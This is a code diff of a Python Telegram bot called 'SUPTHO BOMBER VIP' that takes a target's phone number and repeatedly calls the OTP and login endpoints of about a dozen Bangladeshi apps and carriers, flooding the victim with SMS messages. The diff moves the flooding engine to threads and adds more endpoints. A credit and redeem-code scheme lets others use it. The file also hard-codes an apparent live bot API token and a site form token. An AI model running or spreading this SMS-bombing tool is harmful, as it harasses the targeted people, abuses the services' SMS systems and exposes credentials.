@@ -1,6 +1,5 @@
 import telebot
-import asyncio
-import aiohttp
+import requests
 import threading
 import time
 import os
@@ -15,7 +14,7 @@ from telebot import types
 # ==========================================
 app = Flask('')
 @app.route('/')
-def home(): return "Supreme Turbo Bot is Running!"
+def home(): return "Multi-Bomb Engine Online!"
 
 def run_web_server():
     port = int(os.environ.get("PORT", 10000))
@@ -25,10 +24,10 @@ def keep_alive():
     threading.Thread(target=run_web_server, daemon=True).start()
 
 # ==========================================
-# 🔧 CONFIGURATION (সঠিকভাবে বসান)
+# 🔧 CONFIGURATION
 # ==========================================
-API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'  # <--- মাত্র একটি কোটেশনের মাঝে টোকেন দিন
-OWNER_ID = 6941003064              # <--- আপনার Numeric ID
+API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'  
+OWNER_ID = 6941003064              # Apnar Numeric ID boshon
 OWNER_NAME = "Suptho Hpd"
 CHANNEL_ID = "@SH_tricks"         
 DATA_FILE = 'bot_db.json'
@@ -51,45 +50,42 @@ def save_data(data):
 db = load_data()
 
 # ==========================================
-# 🚀 ASYNC FAST API ENGINE (Chorki, Bioscope, Hoichoi)
+# 🚀 API ENGINE (Extreme Fast)
 # ==========================================
-async def async_hit(session, url, method, data=None, json_data=None):
+def api_hit(url, method, data=None, json_data=None):
     try:
-        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
         if method == "POST":
-            async with session.post(url, data=data, json=json_data, headers=headers, timeout=3) as resp:
-                return await resp.text()
+            requests.post(url, data=data, json=json_data, headers=headers, timeout=3)
         else:
-            async with session.get(url, headers=headers, timeout=3) as resp:
-                return await resp.text()
-    except: return None
+            requests.get(url, headers=headers, timeout=3)
+    except: pass
 
-async def start_async_bombing(target, amount):
+def start_bombing_engine(target, amount):
+    # API List
     apis = [
-        ("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", None, {"number": "+88"+target}),
-        (f"https://www.bioscopelive.com/en/login/send-otp?phone=88{target}", "GET", None, None),
-        (f"https://api.hoichoi.tv/users/otp?phone={target}&country_code=880", "GET", None, None),
-        ("https://api.apex4u.com/api/auth/login", "POST", None, {"phoneNumber": target}),
-        ("https://shopbasebd.com/store/registration/sendOTP", "POST", {"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"}, None),
-        ("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", None, {"mobile": target}),
-        ("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", {"msisdn": target}, None),
-        (f"https://api.shadhinmusic.com/api/v1/auth/otp?phone={target}", "GET", None, None),
-        ("https://api.shikho.com/auth/v2/send/sms", "POST", None, {"phone": "88"+target, "type": "student"}),
-        ("https://api.ostad.app/api/v2/user/with-otp", "POST", None, {"msisdn": target})
+        lambda: api_hit("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", json_data={"number": "+88"+target}),
+        lambda: api_hit(f"https://www.bioscopelive.com/en/login/send-otp?phone=88{target}", "GET"),
+        lambda: api_hit(f"https://api.hoichoi.tv/users/otp?phone={target}&country_code=880", "GET"),
+        lambda: api_hit("https://api.apex4u.com/api/auth/login", "POST", json_data={"phoneNumber": target}),
+        lambda: api_hit("https://shopbasebd.com/store/registration/sendOTP", "POST", data={"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"}),
+        lambda: api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json_data={"mobile": target}),
+        lambda: api_hit("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", data={"msisdn": target}),
+        lambda: api_hit(f"https://api.shadhinmusic.com/api/v1/auth/otp?phone={target}", "GET"),
+        lambda: api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json_data={"phone": "88"+target, "type": "student"}),
+        lambda: api_hit("https://api.ostad.app/api/v2/user/with-otp", "POST", json_data={"msisdn": target}),
+        lambda: api_hit("https://api.swap.com.bd/api/v1/send-otp", "POST", json_data={"phone": target}),
+        lambda: api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET")
     ]
-    
-    async with aiohttp.ClientSession() as session:
-        tasks = []
-        count = 0
-        while count < amount:
-            for url, method, data, json_data in apis:
-                if count >= amount: break
-                tasks.append(async_hit(session, url, method, data, json_data))
-                count += 1
-        await asyncio.gather(*tasks)
+
+    # Loop logic (Amount = Koibar sob API hit korbe)
+    for _ in range(amount):
+        for run_api in apis:
+            threading.Thread(target=run_api).start()
+        time.sleep(1) # Protiti round er majhe 1 second gap jate block na hoy
 
 # ==========================================
-# 🤖 BOT COMMANDS (Admin Panel Fixed)
+# 🤖 BOT HANDLERS
 # ==========================================
 def is_joined(user_id):
     try:
@@ -106,24 +102,21 @@ def welcome(message):
     
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.add("🚀 Start Bomb", "💳 My Balance", "👥 Refer & Earn", "💰 Redeem Credit")
-    bot.send_message(message.chat.id, "🔥 **SUPTHO BOMBER VIP** 🔥", reply_markup=markup, parse_mode='Markdown')
+    bot.send_message(message.chat.id, "🔥 **SUPTHO BOMBER VIP** 🔥\nAmount 1 = Sob API theke 1ti SMS.", reply_markup=markup)
 
 @bot.message_handler(commands=['admin', 'gencodes', 'stats'])
 def admin_panel(message):
     if message.from_user.id != OWNER_ID: return
-    
     cmd = message.text.split()
     if cmd[0] == '/admin':
-        bot.send_message(message.chat.id, "👑 **Admin Panel**\n`/stats` - Info\n`/gencodes 10` - Codes")
+        bot.send_message(message.chat.id, "👑 Admin commands: `/stats`, `/gencodes 10`")
     elif cmd[0] == '/stats':
         bot.reply_to(message, f"📊 Users: {len(db['users'])}\n🎟️ Codes: {len(db['codes'])}")
     elif cmd[0] == '/gencodes':
-        try:
-            num = int(cmd[1])
-            codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=7)) for _ in range(num)]
-            db['codes'].extend(codes); save_data(db)
-            bot.reply_to(message, f"✅ Codes: `{', '.join(codes)}`")
-        except: pass
+        num = int(cmd[1])
+        codes = ["SUP-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=7)) for _ in range(num)]
+        db['codes'].extend(codes); save_data(db)
+        bot.reply_to(message, f"✅ Codes: `{', '.join(codes)}`")
 
 @bot.message_handler(func=lambda m: True)
 def handle_buttons(message):
@@ -132,44 +125,32 @@ def handle_buttons(message):
         return bot.reply_to(message, f"❌ Join {CHANNEL_ID} first!")
 
     if message.text == "🚀 Start Bomb":
-        msg = bot.reply_to(message, "💣 টার্গেট নাম্বার (১১ ডিজিট):")
+        msg = bot.reply_to(message, "💣 Target Number (11 Digit):")
         bot.register_next_step_handler(msg, ask_amount)
     elif message.text == "💳 My Balance":
         cred = "Unlimited" if int(uid) == OWNER_ID else db['users'].get(uid, {}).get('credits', 0)
         bot.reply_to(message, f"💰 Balance: {cred} Credits")
-    elif message.text == "💰 Redeem Credit":
-        msg = bot.reply_to(message, "🎁 Redeem Code দিন:")
-        bot.register_next_step_handler(msg, use_redeem)
 
 def ask_amount(message):
     target = message.text.strip()
-    if len(target) != 11: return bot.reply_to(message, "❌ ভুল নাম্বার!")
-    msg = bot.reply_to(message, f"🎯 Target: {target}\n🔢 পরিমাণ (Max 100):")
+    if len(target) != 11: return bot.reply_to(message, "❌ Wrong Number!")
+    msg = bot.reply_to(message, f"🎯 Target: {target}\n🔢 Round Amount (Max 10):")
     bot.register_next_step_handler(msg, process_bomb, target)
 
 def process_bomb(message, target):
     uid = str(message.from_user.id)
     try:
         amount = int(message.text)
-        if amount > 100: amount = 100
+        if amount > 10: amount = 10 # Safety limit
         
         if int(uid) != OWNER_ID:
             if db['users'][uid]['credits'] < 1: return bot.reply_to(message, "⚠️ No Credits!")
             db['users'][uid]['credits'] -= 1; save_data(db)
         
-        bot.send_message(message.chat.id, f"🚀 **Attack Started!**\nSent: {amount} SMS")
+        bot.send_message(message.chat.id, f"🚀 **Attack Launched!**\nTarget: {target}\nRounds: {amount}")
+        threading.Thread(target=start_bombing_engine, args=(target, amount)).start()
         
-        loop = asyncio.new_event_loop()
-        threading.Thread(target=lambda: loop.run_until_complete(start_async_bombing(target, amount))).start()
-    except: bot.reply_to(message, "❌ ভুল পরিমাণ!")
-
-def use_redeem(message):
-    code = message.text.strip()
-    if code in db['codes']:
-        db['codes'].remove(code)
-        db['users'][str(message.from_user.id)]['credits'] += 10
-        save_data(db); bot.reply_to(message, "✅ +10 Credits Added!")
-    else: bot.reply_to(message, "❌ ভুল কোড।")
+    except: bot.reply_to(message, "❌ Error.")
 
 if __name__ == "__main__":
     try: bot.remove_webhook()
